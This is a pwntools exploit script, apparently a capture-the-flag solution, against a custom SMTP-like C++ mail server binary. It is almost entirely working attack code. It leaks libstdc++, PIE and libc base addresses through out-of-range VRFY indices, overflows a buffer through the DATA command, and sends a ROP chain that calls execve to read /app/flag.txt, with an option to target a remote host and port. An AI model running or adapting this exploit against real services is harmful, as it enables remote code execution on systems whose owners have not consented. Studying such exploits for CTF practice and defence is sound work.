#!/usr/bin/python3

from pwn import *
import sys
from ctypes import CDLL

context.terminal = ["tmux", "split-window", "-vf"]
context.log_level = "info"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "./run_patched"        ### CHANGE ME !!!!!!!!!!!!!!!!

gdbscript = '''
break main.cpp:182
break main.cpp:174
'''
# break main.cpp:169

libcx = CDLL("libc.so.6")
# now = int(floor(time.time()))
# libcx.srand(now)
# print(libcx.rand())

def init():
    ## loading custom libc
    # env = {"LD_PRELOAD": "./desired_libc"}
    ## loading custom libc
    if (args.GDB):
        pp = gdb.debug(binary, gdbscript=gdbscript)
    elif (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
    else :
        pp = process(binary)# env=env)
    return pp

def unpack_ptr(ptr):
    if (len(ptr) < 8):
        ptr += (8 - len(ptr)) * b"\x00"
    return (u64(ptr))

def findip(pp, length):
    cyclic_patt = cyclic(length)
    pp.recv()
    pp.sendline(cyclic_patt)
    pp.wait()
    # offset = cyclic_find(pp.core.pc)
    offset = cyclic_find(pp.corefile.read(pp.core.sp, 4))
    log.info(f"offset found {offset}")

def helo():
    pp.sendline(b"HELO")
    pp.recvline()

def noop():
    pp.sendline(b"NOOP")
    pp.recvline()

def quit():
    pp.sendline(b"QUIT")
    pp.recvline()

def auth(fname, lname, password, handle):
    pp.sendline(f"AUTH {fname} {lname} {password} {handle}".encode())
    pp.recvline()
    return (f"{handle}@jantofix.lol")

def rset() :
    pp.sendline(b"RSET")
    pp.recvline()

def vrfy(email, short=False):
    pp.sendline(f"VRFY handle {email}".encode())
    stat = int(pp.recvline().split()[0])
    if (stat == 250):
        return True
    return False

def mailfrom(email):
    pp.sendline(f"MAIL FROM {email}".encode())
    pp.recvline()

def rcptto(email):
    pp.sendline(f"RCPT TO {email}".encode())
    pp.recvline()

def data(data):
    pp.sendline(b"DATA")
    pp.recvline()
    pp.send(data)
    print(pp.recvline())

def exploit():
    log.info("jantofix zamtofix")
    log.info("leaking addresses")
    pp.recvline()
    pp.sendline(b"VRFY id -s -6")
    libcpp_leak = int(pp.recvline().rstrip().split(b" ")[-1])
    libcpp.address = libcpp_leak - 2604064
    pp.sendline(b"VRFY id -s -92")
    elf.address = int(pp.recvline().rstrip().split(b" ")[-1]) - 45536
    pp.sendline(b"VRFY id -s -95")
    libc.address = int(pp.recvline().rstrip().split(b" ")[-1]) 
    log.info(f"libcpp leak {hex(libcpp_leak)}")
    log.info(f"piebase leak {hex(elf.address)}")
    log.info(f"libcpp base {hex(libcpp.address)}")
    log.info(f"libc base {hex(libc.address)}")
    log.info("logging in")
    a = auth("j", "z", "s", "l")
    b = auth("n", "n", "naaa", "n")
    log.info(f"users {a} {b} logged")
    log.info("overflowing")
    mailfrom(a)
    rcptto(b)
    data((b"\x00" * 1024) + b'\xff')
    data((b"\x00" * 1024 + b'f\x09'))            # making sure that we own dsize
    offset = 2120
    unwind_gadget = elf.address + 17719
    syscall = 0x0000000000197bb4 + libcpp.address
    pop_rdx = 0x00000000001d68bb + libcpp.address
    pop_rdi = 0x00000000000f3d0d + libcpp.address
    pop_rsi = 0x00000000000e4506 + libcpp.address
    pop_rax = 0x00000000000dc7b0 + libcpp.address
    space = elf.address + 54528
    cmd = b"/bin/cat\x00cat\x00/app/flag.txt\x00"
    pay = flat (
            space + len("/bin/cat\x00") + (8 * 3),
            space + len("/bin/cat\x00cat\x00")+ (8 * 3),
            0,
            cmd,
            cyclic(offset - (len(cmd) + (8 * 3))),
            unwind_gadget,
            cyclic(88),
            pop_rdi, 
            space + (8*3) ,
            pop_rsi,
            space,
            pop_rax,
            59,
            pop_rdx,
            0,
            syscall

            )
    data(pay)
    pp.interactive()
    

if (args.REMOTE):
    libc = ELF("./libc.so.6")
    libcpp = ELF("./libstdc++.so.6")
else:
    libcpp = ELF("/usr/lib/libstdc++.so.6.0.33")
    libc = ELF("/usr/lib/libc.so.6")
libcrops = ROP(libc)
elfrops = ROP(libc)
elf = context.binary = ELF(binary)
pp = init()
exploit()
